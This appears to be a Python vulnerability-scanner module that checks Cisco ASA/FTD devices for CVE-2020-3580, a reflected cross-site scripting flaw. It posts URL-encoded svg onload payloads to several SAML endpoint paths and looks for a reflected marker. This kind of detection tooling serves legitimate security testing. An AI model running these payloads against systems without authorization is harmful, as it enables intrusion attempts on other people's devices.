#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
# from lib.tool import check

cve_2020_3580_payloads = [
    {
        'path': '+CSCOE+/saml/sp/acs?tgname=a',
        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
    },
    {
        'path': 'saml/sp/acs?tgname=a',
        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
    },
    {
        'path': 'sp/acs?tgname=a',
        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
    },
    {
        'path': 'acs?tgname=a',
        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
    }
]

def cve_2020_3580_scan(clients):
    ''' Cisco ASA设备/FTD设备 XSS跨站脚本攻击
            反射型
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Cisco',
        'vul_type': 'XSS',
        'vul_id': 'CVE-2020-3580',
    }

    for payload in cve_2020_3580_payloads:         # * Payload
        random_str = random_md5(8)
        
        path = payload['path']                          # * Path
        data = payload['data'].format(TEXT=random_str)  # * Data

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (("onload=confirm('" + random_str + "')") in res.text):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
